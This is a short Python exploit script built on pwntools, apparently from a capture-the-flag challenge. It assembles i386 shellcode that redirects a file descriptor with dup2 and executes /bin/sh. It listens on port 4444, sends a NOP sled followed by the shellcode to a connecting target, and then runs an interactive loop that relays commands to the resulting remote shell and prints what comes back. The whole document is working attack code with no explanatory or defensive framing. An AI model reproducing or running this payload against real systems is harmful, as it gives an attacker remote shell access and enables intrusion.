from pwn import *

import socket
import select
import sys

context.arch = 'i386'
reverse_shellcode = asm('''
    push 0x3f
    pop eax
    xor ebx, ebx
    push 0x1
    pop ecx
    int 0x80

    push 0xb
    pop eax
    push 0x0068732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
''')

HOST = '0.0.0.0'
PORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT))
sock.listen(1)
conn, addr = sock.accept()
conn.sendall(b'\x90' * 0x3c + reverse_shellcode)

while True:
    reading, writing, exception = select.select([conn, sys.stdin], [], [])
    for s in reading:
        if s is sys.stdin:
            command = input().encode()
            conn.sendall(command)
        elif s is conn:
            conn.setblocking(0)
            data = conn.recv(4096).decode()
            print(data, end = '')
